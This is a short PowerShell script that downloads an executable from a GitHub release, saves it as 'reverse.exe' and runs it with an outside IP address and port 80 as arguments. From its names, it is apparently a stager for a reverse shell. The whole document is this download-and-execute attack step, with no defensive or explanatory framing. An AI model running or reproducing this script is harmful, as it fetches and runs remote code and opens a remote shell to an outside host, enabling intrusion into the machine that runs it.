$fileUrl = 'https://github.com/renoob21/rs_client/releases/download/First-Release/rs_client.exe';
$path = 'D:/reverse.exe';

Invoke-WebRequest -Uri $fileUrl -OutFile $path;

if (Test-Path $path) {
    Start-Process -FilePath $path -ArgumentList '178.128.16.88 80';
}